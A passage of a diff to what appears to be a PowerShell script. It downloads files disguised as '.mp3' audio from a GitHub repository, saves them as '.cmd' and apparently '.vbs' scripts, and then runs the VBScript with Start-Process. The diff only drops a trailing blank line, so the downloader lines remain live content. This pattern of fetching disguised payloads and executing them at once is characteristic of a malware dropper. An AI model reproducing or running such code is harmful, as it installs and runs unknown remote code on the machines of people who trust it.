@@ -5,4 +5,3 @@ Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/3.mp3" -OutFile "h
 Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/4.mp3" -OutFile "start.cmd"
 $args = @("Comma","Separated","Arguments")
 Start-Process -Filepath "hstart.vbs" -ArgumentList $args
-
